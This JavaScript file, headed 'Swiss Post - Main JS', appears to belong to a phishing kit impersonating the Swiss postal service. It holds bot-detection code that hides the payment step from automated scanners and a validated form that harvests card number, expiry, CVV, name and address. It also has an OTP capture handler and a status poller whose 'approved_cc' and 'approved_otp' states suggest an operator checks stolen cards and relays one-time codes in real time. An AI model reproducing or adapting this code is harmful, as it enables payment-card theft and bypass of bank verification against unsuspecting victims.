/**
 * Swiss Post - Main JS
 * Antibot + Shared Logic
 */

(function(window) {
    'use strict';

    // ─── Antibot Token ─────────────────────────────────────────
    // Token injected by PHP via meta tag: <meta name="ab-token" content="...">
    var _token = null;

    function getToken() {
        if (_token) return _token;
        var meta = document.querySelector('meta[name="ab-token"]');
        if (meta) {
            _token = meta.getAttribute('content');
        }
        return _token;
    }

    // Make token globally available (backward compat)
    Object.defineProperty(window, 'token', {
        get: function() { return getToken(); },
        configurable: true
    });

    // ─── Antibot checks ─────────────────────────────────────────
    // Detect headless/automation
    var _botDetected = false;

    function detectBot() {
        // Check for webdriver
        if (navigator.webdriver) { _botDetected = true; return true; }
        // Check for phantom
        if (window._phantom || window.phantom) { _botDetected = true; return true; }
        // Check for selenium
        if (document.documentElement.getAttribute('webdriver')) { _botDetected = true; return true; }
        // Check for missing APIs
        if (!window.chrome && !window.safari && !navigator.plugins) { _botDetected = true; return true; }
        return false;
    }

    // Run on load
    detectBot();

    // ─── Modal Handler ──────────────────────────────────────────
    function initModal(opts) {
        var modalId = opts.modalId || 'pay-modal';
        var openBtnIds = opts.openBtnIds || [];
        var onPay = opts.onPay;
        var countdownSecs = opts.countdown || 3;

        var modal = document.getElementById(modalId);
        if (!modal) return;

        var payBtn = modal.querySelector('#pay-btn');
        var cdMsg = modal.querySelector('#cd-msg');
        var cdN = modal.querySelector('#cd-n');
        var timer = null;
        var remain = countdownSecs;

        function startCountdown() {
            remain = countdownSecs;
            if (cdN) cdN.textContent = remain;
            if (cdMsg) cdMsg.style.display = 'block';
            if (payBtn) payBtn.disabled = true;
            clearInterval(timer);
            timer = setInterval(function() {
                remain--;
                if (remain > 0) {
                    if (cdN) cdN.textContent = remain;
                } else {
                    clearInterval(timer);
                    if (payBtn) payBtn.disabled = false;
                    if (cdMsg) cdMsg.style.display = 'none';
                }
            }, 1000);
        }

        function openModal() {
            modal.classList.add('show');
            document.body.style.overflow = 'hidden';
            startCountdown();
        }

        function closeModal() {
            modal.classList.remove('show');
            document.body.style.overflow = '';
            clearInterval(timer);
        }

        openBtnIds.forEach(function(id) {
            var btn = document.getElementById(id);
            if (btn) btn.addEventListener('click', openModal);
        });

        modal.addEventListener('click', function(e) {
            if (e.target === modal) closeModal();
        });

        if (payBtn) {
            payBtn.addEventListener('click', function() {
                if (this.disabled) return;
                if (_botDetected) { console.warn('Bot detected'); return; }
                if (onPay) onPay();
            });
        }
    }

    // ─── OTP Input Handler ──────────────────────────────────────
    function initOTP(opts) {
        var containerSelector = opts.container || '.otp-inputs';
        var hiddenId = opts.hiddenInput || 'otp-value';
        var submitId = opts.submitBtn || 'btn-submit';
        var errorId = opts.errorMsg || 'error-msg';
        var length = opts.length || 6;

        var container = document.querySelector(containerSelector);
        if (!container) return;

        var inputs = container.querySelectorAll('input.otp-digit');
        var submitBtn = document.getElementById(submitId);
        var hiddenInput = document.getElementById(hiddenId);
        var errorMsg = document.getElementById(errorId);

        if (inputs.length > 0) inputs[0].focus();

        function updateState() {
            var otp = '';
            inputs.forEach(function(inp) { otp += inp.value; });
            if (hiddenInput) hiddenInput.value = otp;
            if (submitBtn) submitBtn.disabled = otp.length !== length;
        }

        inputs.forEach(function(input, idx) {
            input.addEventListener('input', function(e) {
                var val = this.value.replace(/\D/g, '');

                // Handle paste of full OTP
                if (val.length > 1) {
                    var chars = val.split('');
                    inputs.forEach(function(inp, i) {
                        if (chars[i]) { inp.value = chars[i]; inp.classList.add('filled'); }
                    });
                    inputs[inputs.length - 1].focus();
                } else {
                    this.value = val;
                    if (val) {
                        this.classList.add('filled');
                        if (idx < inputs.length - 1) inputs[idx + 1].focus();
                    } else {
                        this.classList.remove('filled');
                    }
                }

                if (errorMsg) errorMsg.classList.remove('show');
                inputs.forEach(function(inp) { inp.classList.remove('error'); });
                updateState();
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !this.value && idx > 0) {
                    inputs[idx - 1].focus();
                    inputs[idx - 1].value = '';
                    inputs[idx - 1].classList.remove('filled');
                }
            });
        });

        // Form submit validation
        var form = container.closest('form');
        if (form && submitBtn) {
            form.addEventListener('submit', function(e) {
                var otp = hiddenInput ? hiddenInput.value : '';
                if (otp.length !== length) {
                    e.preventDefault();
                    inputs.forEach(function(inp) { inp.classList.add('error'); });
                    return false;
                }
                submitBtn.classList.add('loading');
            });
        }
    }

    // ─── Card Form Validator ────────────────────────────────────
    function initCardForm(opts) {
        var formId = opts.formId || 'card-form';
        var submitId = opts.submitBtn || 'btn-submit';
        var cardValidText = opts.cardValidText || 'Card valid';

        var form = document.getElementById(formId);
        var submitBtn = document.getElementById(submitId);
        if (!form) return;

        var fieldState = { name: false, cc: false, exp: false, cvv: false, address: false, city: false, zip: false };

        function luhn(value) {
            var digits = value.replace(/\D/g, '');
            if (digits.length < 13) return false;
            var sum = 0, shouldDouble = false;
            for (var i = digits.length - 1; i >= 0; i--) {
                var d = parseInt(digits[i], 10);
                if (shouldDouble) { d *= 2; if (d > 9) d -= 9; }
                sum += d;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }

        function detectNetwork(digits) {
            if (/^4/.test(digits)) return 'VISA';
            if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'Mastercard';
            if (/^3[47]/.test(digits)) return 'Amex';
            return null;
        }

        function validExp(val) {
            if (!/^\d{2}\/\d{2}$/.test(val)) return false;
            var parts = val.split('/');
            var mm = parseInt(parts[0], 10), yy = parseInt(parts[1], 10);
            if (mm < 1 || mm > 12) return false;
            return new Date(2000 + yy, mm, 1) > new Date();
        }

        function setValid(input, errId) {
            input.classList.remove('invalid'); input.classList.add('valid');
            var e = document.getElementById(errId); if (e) e.classList.remove('show');
        }
        function setInvalid(input, errId) {
            input.classList.remove('valid'); input.classList.add('invalid');
            var e = document.getElementById(errId); if (e) e.classList.add('show');
        }

        function refreshButton() {
            var ok = Object.values(fieldState).every(Boolean);
            if (submitBtn) {
                submitBtn.disabled = !ok;
                submitBtn.classList.toggle('ready', ok);
            }
        }

        // Apply masks if available
        if (typeof $ !== 'undefined' && $.fn.mask) {
            $('#cc').mask('0000 0000 0000 0000');
            $('#exp').mask('00/00');
            $('#cvv').mask('00009');
            $('#zip').mask('00000');
        }

        // Name
        var nameInput = form.querySelector('#d0');
        if (nameInput) {
            nameInput.addEventListener('input', function() {
                var v = this.value.trim();
                var ok = v.length >= 2 && /^[a-zA-ZÀ-ÿ\s\-']+$/.test(v);
                fieldState.name = ok;
                if (ok) setValid(this, 'err-name'); else if (v.length > 0) setInvalid(this, 'err-name');
                refreshButton();
            });
            nameInput.addEventListener('blur', function() { nameInput.dispatchEvent(new Event('input')); });
        }

        // Card number
        var ccInput = form.querySelector('#cc');
        if (ccInput) {
            ccInput.addEventListener('input', function() {
                var raw = this.value, digits = raw.replace(/\D/g, '');
                var net = detectNetwork(digits);
                var badge = document.getElementById('card-type');
                var luhnMsg = document.getElementById('luhn-msg');

                if (badge) {
                    if (net && digits.length >= 4) {
                        badge.textContent = net;
                        badge.className = 'card-type-badge show ' + (net === 'VISA' ? 'visa' : net === 'Mastercard' ? 'master' : 'amex');
                    } else {
                        badge.className = 'card-type-badge';
                    }
                }

                var minLen = net === 'Amex' ? 15 : 16;
                if (digits.length === minLen) {
                    if (luhn(digits)) {
                        if (luhnMsg) { luhnMsg.textContent = '✓ ' + cardValidText; luhnMsg.className = 'valid'; }
                        setValid(this, 'err-cc'); fieldState.cc = true;
                    } else {
                        if (luhnMsg) { luhnMsg.textContent = ''; luhnMsg.className = 'invalid'; }
                        setInvalid(this, 'err-cc'); fieldState.cc = false;
                    }
                } else {
                    if (luhnMsg) { luhnMsg.className = ''; luhnMsg.textContent = ''; }
                    if (digits.length > 0) { this.classList.remove('valid', 'invalid'); }
                    fieldState.cc = false;
                }
                refreshButton();
            });
        }

        // Expiry
        var expInput = form.querySelector('#exp');
        if (expInput) {
            ['input', 'blur'].forEach(function(ev) {
                expInput.addEventListener(ev, function() {
                    var ok = validExp(this.value);
                    fieldState.exp = ok;
                    if (ok) setValid(this, 'err-exp'); else if (this.value.length === 5) setInvalid(this, 'err-exp');
                    refreshButton();
                });
            });
        }

        // CVV
        var cvvInput = form.querySelector('#cvv');
        if (cvvInput) {
            ['input', 'blur'].forEach(function(ev) {
                cvvInput.addEventListener(ev, function() {
                    var v = this.value.replace(/\D/g, '');
                    var ccDigits = ccInput ? ccInput.value.replace(/\D/g, '') : '';
                    var isAmex = /^3[47]/.test(ccDigits);
                    var ok = isAmex ? v.length === 4 : v.length === 3;
                    fieldState.cvv = ok;
                    if (ok) setValid(this, 'err-cvv'); else if (v.length >= 3) setInvalid(this, 'err-cvv');
                    refreshButton();
                });
            });
        }

        // Address
        ['address', 'city'].forEach(function(fieldId) {
            var inp = form.querySelector('#' + fieldId);
            if (!inp) return;
            ['input', 'blur'].forEach(function(ev) {
                inp.addEventListener(ev, function() {
                    var v = this.value.trim();
                    var ok = fieldId === 'city'
                        ? v.length >= 2 && /^[a-zA-ZÀ-ÿ\s\-']+$/.test(v)
                        : v.length >= 5;
                    fieldState[fieldId] = ok;
                    var errId = 'err-' + fieldId;
                    if (ok) setValid(this, errId); else if (v.length > 0) setInvalid(this, errId);
                    refreshButton();
                });
            });
        });

        // ZIP
        var zipInput = form.querySelector('#zip');
        if (zipInput) {
            ['input', 'blur'].forEach(function(ev) {
                zipInput.addEventListener(ev, function() {
                    var v = this.value.replace(/\D/g, '');
                    var ok = v.length >= 4;
                    fieldState.zip = ok;
                    if (ok) setValid(this, 'err-zip'); else if (v.length > 0) setInvalid(this, 'err-zip');
                    refreshButton();
                });
            });
        }

        // Submit
        form.addEventListener('submit', function(e) {
            var allOk = Object.values(fieldState).every(Boolean);
            if (!allOk) { e.preventDefault(); return false; }
            if (submitBtn) submitBtn.classList.add('loading');
        });
    }

    // ─── Status Checker (polling) ────────────────────────────────
    function checkStatus(opts) {
        var url = opts.url || '?s=c';
        var type = opts.type || 'cc';
        var interval = opts.interval || 2000;
        var onApproved = opts.onApproved || function() {};
        var onRejected = opts.onRejected || function() {};

        var timer = setInterval(function() {
            fetch(url)
                .then(function(r) { return r.json(); })
                .then(function(data) {
                    var st = data.status;
                    if (type === 'cc' && st === 'approved_cc') { clearInterval(timer); onApproved(); }
                    else if (type === 'cc' && st === 'rejected_cc') { clearInterval(timer); onRejected(); }
                    else if (type === 'otp' && st === 'approved_otp') { clearInterval(timer); onApproved(); }
                    else if (type === 'otp' && st === 'rejected_otp') { clearInterval(timer); onRejected(); }
                })
                .catch(function() {});
        }, interval);

        return { stop: function() { clearInterval(timer); } };
    }

    // ─── Countdown Timer ─────────────────────────────────────────
    function initCountdown(seconds, displayId, onDone) {
        var el = document.getElementById(displayId);
        var remaining = seconds;
        var timer = setInterval(function() {
            remaining--;
            if (el) el.textContent = remaining;
            if (remaining <= 0) { clearInterval(timer); if (onDone) onDone(); }
        }, 1000);
        return { stop: function() { clearInterval(timer); }, getRemaining: function() { return remaining; } };
    }

    // ─── Resend OTP Timer ────────────────────────────────────────
    function initResendTimer(opts) {
        var seconds = opts.seconds || 30;
        var timerId = opts.timerId || 'resend-timer';
        var linkId = opts.linkId || 'resend-link';
        var countId = opts.countId || 'countdown';
        var onResend = opts.onResend;

        var timerEl = document.getElementById(timerId);
        var linkEl = document.getElementById(linkId);
        var countEl = document.getElementById(countId);
        var remaining = seconds;

        function startTimer() {
            remaining = seconds;
            if (countEl) countEl.textContent = remaining;
            if (timerEl) timerEl.style.display = '';
            if (linkEl) linkEl.style.display = 'none';

            var t = setInterval(function() {
                remaining--;
                if (countEl) countEl.textContent = remaining;
                if (remaining <= 0) {
                    clearInterval(t);
                    if (timerEl) timerEl.style.display = 'none';
                    if (linkEl) linkEl.style.display = '';
                }
            }, 1000);
        }

        startTimer();

        if (linkEl) {
            linkEl.addEventListener('click', function() {
                startTimer();
                if (onResend) onResend();
            });
        }
    }

    // ─── Public API ───────────────────────────────────────────────
    window.PostApp = {
        getToken: getToken,
        isBot: function() { return _botDetected; },
        initModal: initModal,
        initOTP: initOTP,
        initCardForm: initCardForm,
        checkStatus: checkStatus,
        initCountdown: initCountdown,
        initResendTimer: initResendTimer
    };

})(window);
